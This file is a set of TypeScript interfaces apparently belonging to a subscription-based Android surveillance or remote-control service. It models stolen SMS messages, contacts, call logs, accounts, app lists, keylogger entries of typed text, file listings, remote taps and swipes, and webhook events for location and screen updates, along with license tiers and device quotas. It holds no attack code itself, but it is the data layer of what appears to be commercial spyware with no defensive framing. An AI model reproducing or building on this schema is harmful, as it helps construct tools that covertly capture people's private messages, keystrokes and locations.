export interface AndroidDevice {
  id: string;
  user_id: string;
  name: string;
  model: string;
  status: "online" | "offline";
  last_sync: string;
  created_at: string;
  updated_at: string;
}

export interface DeviceInfo {
  uuid: string;
  manufacturer: string;
  brand: string;
  model: string;
  device: string;
  hardware: string;
  product: string;
  board: string;
  bootloader: string;
  host: string;
  user: string;
  build_id: string;
  build_time: number;
  is_emulator: boolean;
  sdk_int: number;
  base_os: string;
  display: string;
  screen_width: number;
  screen_height: number;
  wifi_ssid: string;
  wifi_bssid: string;
  ip_address: string;
  mac_address: string;
  network_operator: string;
  sim_operator: string;
  sim_country: string;
  is_roaming: boolean;
  data_state: number;
  internal_total_storage: number;
  internal_free_storage: number;
  total_ram: number;
  available_ram: number;
  battery_level: number;
  battery_charging: boolean;
  locale: string;
  timezone: string;
  language: string;
  cpu_abi: string;
  cpu_cores: number;
  camera_count: number;
  is_rooted: boolean;
}

export interface SMSMessage {
  id: string;
  device_id: string;
  address: string;
  body: string;
  date: string;
  type: "sent" | "received";
  sim_slot?: string;
  [key: string]: any; // Allow additional fields
}

export interface Contact {
  id: string;
  device_id: string;
  name: string;
  phone: string;
  email?: string;
}

export interface CallLog {
  id: string;
  device_id: string;
  number: string;
  name?: string;
  type: "incoming" | "outgoing" | "missed";
  duration: number;
  date: string;
}

export interface Account {
  id: string;
  device_id: string;
  name: string;
  type: string;
  app_name?: string;
  icon?: string; // Base64 encoded icon
  email?: string;
  [key: string]: any; // Allow additional fields
}

export interface App {
  id: string;
  device_id: string;
  package_name: string;
  app_name: string;
  version?: string;
  version_code?: number;
  type?: "user" | "system";
  [key: string]: any; // Allow additional fields
}

export interface KeyloggerEntry {
  id: string;
  type: string;
  text: string;
  package_name: string;
  app_name?: string;
  timestamp: string;
}

export interface FileItem {
  id: string;
  device_id: string;
  path: string;
  name: string;
  type: "file" | "directory";
  size?: number;
  modified: string;
}

export interface DeviceInteraction {
  type: "tap" | "swipe" | "long_press" | "scroll";
  x: number;
  y: number;
  duration?: number;
  deltaX?: number;
  deltaY?: number;
}

export interface UserProfile {
  id: string;
  email: string;
  email_hash: string | null;
  license_id: string | null;
  username: string | null;
  role: "admin" | "user";
  subscription_tier: "free" | "basic" | "premium" | "enterprise";
  subscription_status: "active" | "expired" | "cancelled" | "trial";
  subscription_start_date: string | null;
  subscription_end_date: string | null;
  license_key_validity: string | null;
  max_devices: number;
  is_active: boolean;
  created_at: string;
  updated_at: string;
}

export interface AdminActivityLog {
  id: string;
  admin_id: string;
  action: string;
  target_user_id: string | null;
  details: Record<string, any> | null;
  created_at: string;
}

export interface UserUpdateData {
  role?: "admin" | "user";
  license_id?: string | null;
  subscription_tier?: "free" | "basic" | "premium" | "enterprise";
  subscription_status?: "active" | "expired" | "cancelled" | "trial";
  subscription_start_date?: string;
  subscription_end_date?: string;
  license_key_validity?: string | null;
  max_devices?: number;
  is_active?: boolean;
}

export interface WebhookEvent {
  event: string;
  device_id: string;
  user_id?: string;
  timestamp: string;
  data: Record<string, any>;
}

export type WebhookEventType =
  | "device_status"
  | "sms_received"
  | "sms_sent"
  | "call_logged"
  | "file_uploaded"
  | "file_deleted"
  | "contact_synced"
  | "screen_update"
  | "device_sync"
  | "notification_received"
  | "location_update"
  | "battery_status"
  | "app_installed"
  | "app_uninstalled";